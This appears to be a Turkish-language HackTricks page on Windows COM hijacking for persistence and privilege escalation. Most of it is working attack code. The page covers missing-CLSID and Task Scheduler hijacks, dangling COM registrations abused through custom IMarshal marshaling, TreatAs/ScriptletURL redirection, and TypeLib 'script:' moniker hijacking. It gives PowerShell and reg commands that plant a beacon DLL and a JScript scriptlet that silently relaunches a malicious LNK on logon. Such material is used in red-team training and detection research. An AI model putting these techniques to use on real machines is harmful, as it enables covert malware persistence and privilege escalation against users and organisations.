# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Var olmayan COM bileşenlerini arama

HKCU değerleri kullanıcılar tarafından değiştirilebildiğinden, **COM Hijacking** bir **kalıcılık mekanizması** olarak kullanılabilir. `procmon` kullanarak henüz mevcut olmayan ve bir saldırgan tarafından oluşturulabilecek COM kayıt defteri girdilerini bulmak kolaydır. Klasik filtreler:

- **RegOpenKey** işlemleri.
- _Result_ değeri **NAME NOT FOUND** olanlar.
- _Path_ değeri **InprocServer32** ile bitenler.

Arama sırasında kullanılabilecek faydalı seçenekler:

- Eksik **`LocalServer32`** anahtarlarını da arayın. Bazı COM sınıfları işlem dışı sunuculardır ve DLL yerine saldırganın kontrolündeki bir EXE'yi başlatır.
- `InprocServer32` işlemlerine ek olarak **`TreatAs`** ve **`ScriptletURL`** kayıt defteri işlemlerini de arayın. Güncel tespit içerikleri ve malware incelemeleri bunlara sık sık dikkat çekiyor; çünkü bunlar normal COM kayıtlarına göre çok daha nadirdir ve bu nedenle güçlü sinyal oluşturur.
- Bir kaydı HKCU'ya kopyalarken, orijinal `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` kaydındaki geçerli **`ThreadingModel`** değerini kopyalayın. Yanlış model kullanmak aktivasyonun bozulmasına ve hijack'in fark edilmesini kolaylaştırmaya neden olabilir.<sup>[[3]](#references)</sup>
- 64 bit sistemlerde hem 64 bit hem de 32 bit görünümlerini inceleyin (`procmon.exe` ve `procmon64.exe`, `HKLM\Software\Classes` ve `HKLM\Software\Classes\WOW6432Node`); çünkü 32 bit uygulamalar farklı bir COM kaydını çözümleyebilir.

Hangi var olmayan COM'u taklit edeceğinize karar verdikten sonra aşağıdaki komutları çalıştırın. _Saniyede birkaç kez yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun; bu gereğinden fazla olabilir._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Ele geçirilebilir Task Scheduler COM bileşenleri

Windows Tasks, COM nesnelerini çağırmak için Custom Triggers kullanır ve bunlar Task Scheduler üzerinden çalıştırıldığından, ne zaman tetikleneceklerini tahmin etmek daha kolaydır.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Çıktıyı kontrol ederek, örneğin **bir kullanıcı her oturum açtığında** çalıştırılacak olanı seçebilirsiniz.

Ardından **{1936ED8A-BD93-3213-E325-F38D112938EF}** CLSID'sini **HKEY\CLASSES\ROOT\CLSID** içinde ve HKLM ile HKCU'da aradığınızda, genellikle değerin HKCU'da bulunmadığını görürsünüz.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Ardından, yalnızca HKCU girdisini oluşturmanız yeterlidir; kullanıcı her oturum açtığında backdoor'unuz çalıştırılır.

## Sarkan COM Kayıtları ve Özel Marshaling

Makine genelindeki bir COM kaydı, registry'yi değiştirmeden DLL planting primitive haline gelebilir. DLL'si bulunmayan ve son yolu düşük ayrıcalıklı bir kullanıcı tarafından oluşturulabilen veya değiştirilebilen bir `InprocServer32` değeri arayın. Tam DLL adını ilgili konuma yerleştirmek, CLSID'yi etkinleştiren tüm süreçlerin saldırgan kodunu yüklemesini sağlar. CrossDevice örneğinde kayıtlı yol `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll` idi; bu nedenle standart bir kullanıcı eksik alt dizini ve DLL'yi oluşturabiliyordu.<sup>[[5]](#references)</sup>

### `IMarshal` süreçler arası DLL yükleme primitive'i olarak

COM, normalde bir arayüz işaretçisini alıcıyı özgün nesneye yönlendiren standart bir `OBJREF` ile temsil eder. `IMarshal` uygulayan bir nesne bunun yerine özel bir `OBJREF` üretebilir. `GetUnmarshalClass` yöntemi, alıcı süreçte nesneyi yeniden oluşturacak kodun CLSID'sini sağlar. Bu CLSID'nin özgün nesneyi tanımlaması gerekmez. COM, bunu süreç içi sunucu olarak çözümler ve istenen arayüz yöntemini çağırmadan önce kayıtlı DLL'yi yükler.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Kötü amaçlı minimal bir uygulama için `GetUnmarshalClass` içindeki sarkan CLSID'yi değiştirmek yeterlidir.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Bu nesneyi, `[in] IUnknown *` gibi proxy üzerinden iletilen bir method parametresi aracılığıyla gönderin. Diğer bir seçenek, custom-marshaled nesnenin yerel denetimleri geçebilmek için yeterli `IStorage` arayüzünü de uyguladığı `CoGetInstanceFromIStorage` yöntemidir. Uzak sunucudaki otomatik unmarshaling, yerine konan CLSID'yi çözümler; böylece DLL, hedef method çalışmadan önce yüklenir.<sup>[[5]](#references)</sup>

Bu primitive yalnızca eksik kayıtlarla sınırlı değildir. Alıcıya mevcut bir custom-unmarshaler DLL'sini yüklemeye zorlayabilir ve DLL'nin yükleme veya unmarshaling yolundaki bug'ları açığa çıkarabilir.<sup>[[5]](#references)</sup>

Bu zincirin çalışması için aşağıdaki koşulların tümü gerekir:<sup>[[5]](#references)</sup>

1. Makine genelinde görülebilen bir CLSID, eksik veya değiştirilebilir bir in-process DLL'yi işaret eder.
2. Saldırgan bu DLL'yi çözümlenen yola yerleştirebilir.
3. Etkinleştirilebilir bir out-of-process COM server, istenen ayrıcalık düzeyinde çalışır.
4. Server, custom marshaling'i kabul eder ve saldırganın nesnesini process sınırından geçiren proxy'li bir çağrı sunar.

### Sahipsiz in-process server'ları bulma

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) ve [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools), makine COM veritabanını sıralayabilir ve her server'ı normal Win32 modül çözümlemesi üzerinden test edebilir. Bazı kayıtlar yalnızca dosya adı içerip loader arama yoluna bağlı olduğundan, bu yöntem `Test-Path` kullanmaktan daha uygundur.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Sonucu exploit edilebilirliğin kanıtı olarak değil, aday listesi olarak değerlendirin. Yolu loader'ın yaptığı gibi çözümleyin, ardından ilk mevcut üst dizindeki ve zaten varsa hedef DLL'deki DACL'yi inceleyin. Eksik bir dosya ancak saldırganın COM'un gerçekten çözeceği yolu oluşturabilmesi veya değiştirebilmesi durumunda işe yarar.<sup>[[5]](#references)</sup>

### Privileged receiver'ı seçip başlatma

Aday COM sınıflarını `RunAs`, service association, kullanılabilir interfaces ve RPC proxies açısından inceleyin. `SYSTEM` için yapılandırılmış ancak adı belirtilmiş bir service tarafından desteklenmeyen bir sınıf, RPCSS onu başlatamadığı için doğrudan activation işlemi sırasında başarısız olabilir. Bu durumda, host'unu başlatan ayrıcalıksız bir tetikleyici (örneğin çalıştırılabilir bir scheduled task) arayın ve server'ı çalışır durumda tutan named-event veya IPC ön koşullarını yeniden oluşturun.<sup>[[5]](#references)</sup>

Örneğin, savunmasız Shell Create Object Handler zinciri, kullanıcı tarafından çalıştırılabilen bir scheduled task'i çağırmadan önce beklenen global event'i oluşturarak host'unu başlattı.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Ortaya çıkan nesne başvurusunu host’una kadar izleyin ve hem kimliğini hem de marshaling politikasını doğrulayın. Ardından arayüzleri listeleyin ve proxy’lerini IDL’ye dönüştürerek sahte nesneyi marshal edecek `IUnknown *` gibi bir giriş parametresi bulun.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Custom-marshaling korumaları

Uygun bir alıcı, güvenilmeyen custom marshaler'ları reddetmelidir. Süreç genelindeki iki koruma, `CoInitializeSecurity`'ye geçirilen capabilities içindeki `EOAC_NO_CUSTOM_MARSHAL` ve `IGlobalOptions::Set` aracılığıyla ayarlanan `COMGLB_UNMARSHALING_POLICY_STRONG` değeridir. Semboller mevcutsa ilgili durum `combase!gCapabilities` ve `combase!g_GLBOPT_UnmarshalingPolicy` içinde incelenebilir; NtObjectManager, süreç ayrıştırıcısının ilgili Windows derlemesini desteklediği durumlarda sonucu `CustomMarshalAllowed` olarak sunar.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs`, bir CLSID'nin başka bir CLSID tarafından taklit edilmesine olanak tanır.<sup>[[4]](#references)</sup> Saldırgan bakış açısından bu, orijinal CLSID'yi olduğu gibi bırakabileceğiniz, `scrobj.dll`'yi işaret eden ikinci bir kullanıcı başına CLSID oluşturabileceğiniz ve ardından `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` ile gerçek COM nesnesini kötü amaçlı olana yönlendirebileceğiniz anlamına gelir.

Bu yöntem şu durumlarda kullanışlıdır:

- hedef uygulama, oturum açma sırasında veya uygulama başlatıldığında zaten sabit bir CLSID örneği oluşturuyorsa
- orijinal `InprocServer32` değerini değiştirmek yerine yalnızca kayıt defterinde bir yönlendirme istiyorsanız
- `ScriptletURL` değeri üzerinden yerel veya uzak bir `.sct` scriptlet'i çalıştırmak istiyorsanız

Örnek iş akışı (herkese açık Atomic Red Team tradecraft'inden ve eski COM kayıt defteri kötüye kullanım araştırmalarından uyarlanmıştır):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notlar:

- `scrobj.dll`, `ScriptletURL` değerini okur ve başvurulan `.sct` dosyasını çalıştırır; bu nedenle payload'ı yerel dosya olarak tutabilir veya HTTP/HTTPS üzerinden uzaktan alabilirsiniz.
- `TreatAs`, özellikle özgün COM kaydı HKLM'de eksiksiz ve kararlı olduğunda kullanışlıdır; çünkü tüm ağacı yansıtmak yerine yalnızca küçük bir kullanıcı başına yönlendirme eklemeniz yeterlidir.
- Doğal tetikleyiciyi beklemeden doğrulama yapmak için hedef sınıf STA aktivasyonunu destekliyorsa sahte ProgID/CLSID'yi `rundll32.exe -sta <ProgID-or-CLSID>` ile manuel olarak örnekleyebilirsiniz.

## COM TypeLib Hijacking (script: moniker persistence)

Type Library'ler (TypeLib), COM arayüzlerini tanımlar ve `LoadTypeLib()` aracılığıyla yüklenir. Bir COM sunucusu örneklendiğinde işletim sistemi, `HKCR\TypeLib\{LIBID}` altındaki kayıt defteri anahtarlarına başvurarak ilişkili TypeLib'i de yükleyebilir. TypeLib yolu `script:C:\...\evil.sct` gibi bir **moniker** ile değiştirilirse Windows, TypeLib çözümlenirken scriptlet'i çalıştırır; böylece sık kullanılan bileşenlere dokunulduğunda tetiklenen gizli bir kalıcılık elde edilir.

Bunun Microsoft Web Browser denetimine karşı kullanıldığı gözlemlenmiştir (Internet Explorer, WebBrowser'ı gömen uygulamalar ve hatta `explorer.exe` tarafından sıkça yüklenir).<sup>[[1]](#references)[[2]](#references)</sup>

### Adımlar (PowerShell)

1) Sık kullanılan bir CLSID'nin kullandığı TypeLib'i (LIBID) belirleyin. Örnek: Kötü amaçlı yazılım zincirlerinin sıkça kötüye kullandığı CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Kullanıcı başına TypeLib yolunu `script:` moniker kullanarak yerel bir scriptlet'e yönlendirin (admin yetkisi gerekmez):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Ana payload'ınızı (ör. ilk zincirde kullanılan bir `.lnk`) yeniden başlatan minimal bir JScript `.sct` bırakın:

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Tetikleme – IE'yi, WebBrowser control'ü gömen bir uygulamayı açmak veya sıradan Explorer etkinlikleri bile TypeLib'i yükleyip scriptlet'i çalıştırarak oturum açma/yeniden başlatma sırasında zincirinizi yeniden etkinleştirir.

Temizleme
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notlar
- Aynı mantığı diğer sık kullanılan COM bileşenlerine de uygulayabilirsiniz; önce `HKCR\CLSID\{CLSID}\TypeLib` yolundan gerçek `LIBID` değerini bulun.
- 64-bit sistemlerde 64-bit tüketiciler için `win64` alt anahtarını da oluşturabilirsiniz.

## References

- [1] [TypeLib'i ele geçirme – Yeni COM kalıcılık tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Kampanyası: ABD Şirketlerini Hedef Alan Gelişmiş Bir Kimlik Avı Saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM Hijacking'i yeniden inceleme (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Anahtarı (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Windows Exploitation Techniques: Sahipsiz COM Nesnesi Kayıtları](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal arabirimi](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

